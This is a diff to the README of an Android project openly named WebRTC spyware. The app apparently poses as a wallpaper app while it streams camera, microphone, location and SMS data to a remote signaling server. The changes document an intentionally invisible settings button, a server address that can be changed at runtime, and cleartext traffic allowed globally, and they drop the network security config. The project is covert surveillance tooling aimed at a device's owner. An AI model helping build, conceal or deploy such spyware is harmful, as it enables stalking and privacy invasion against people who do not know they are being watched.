@@ -60,6 +60,12 @@ https://github.com/DhruvAthaide/Android_WebRTC_Spyware/tree/autostream
 - ⚡ **Ultra-Low Latency**: Optimized for real-time performance
 - 🔄 **Auto-Reconnection**: Intelligent connection recovery
 
+
+### ⚙️ **Dynamic Signaling Server (IP/Port) Configuration**
+- ✍️ **hange IP/Port at runtime** from the app’s Streaming Settings page. The current server URL is stored in SharedPreferences.
+- 🧭 **Invisible Settings Button**: The settings button in the top-right corner is intentionally invisible but clickable. Tap the top-right area to open Streaming Settings.
+- 🌐 **No ```network_security_config.xml``` required**: The app allows cleartext globally (debug/dev friendly). You do not need to list every IP or edit an XML.
+
 ### 💻 **Interactive Web Dashboard**
 - 📊 **Real-time Status Updates**: Live connection and streaming status
 - 🎮 **Responsive Interface**: Works seamlessly across all modern browsers
@@ -80,7 +86,6 @@ https://github.com/DhruvAthaide/Android_WebRTC_Spyware/tree/autostream
 │   │   ├── ⚙️ StreamingSettingsActivity.java # Streaming controls
 │   │   └── 🎨 WallpaperAdapter.java          # Wallpaper grid manager
 │   ├── 📋 src/main/AndroidManifest.xml       # App permissions & config
-│   ├── 🔒 src/main/res/xml/network_security_config.xml
 │   └── 🔧 build.gradle.kts                   # Build configuration
 ├── 🖥️ Android-WebRTC-Spyware-Server/
 │   ├── ⚡ server.js                          # Node.js signaling server
@@ -100,7 +105,6 @@ https://github.com/DhruvAthaide/Android_WebRTC_Spyware/tree/autostream
 | **📡 StreamingService.java** | Heart of streaming functionality | WebRTC initialization, multi-stream capture, signaling |
 | **⚙️ StreamingSettingsActivity.java** | User control interface | Permission requests, stream toggles, settings management |
 | **🔒 AndroidManifest.xml** | Security & permissions | Camera, microphone, location, SMS permissions |
-| **🔒 network_security_config.xml** | Network security | Cleartext traffic configuration for local server |
 | **⚡ server.js** | WebRTC signaling hub | Socket.IO management, peer connection facilitation |
 | **🎨 index.html & 🔧 client.js** | Web dashboard | Stream display, real-time updates, user interface |
 
@@ -177,11 +181,6 @@ ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
 **In `StreamingService.java`**:
 ```java
 private static final String SIGNALING_URL = "http://YOUR_SERVER_IP:3000";  // 🔧 Update IP
-```
-
-**In `network_security_config.xml`**:
-```xml
-<domain includeSubdomains="true">YOUR_SERVER_IP</domain>  <!-- 🔧 Update IP -->
 ```
 
 #### ✅ **Verify Permissions**
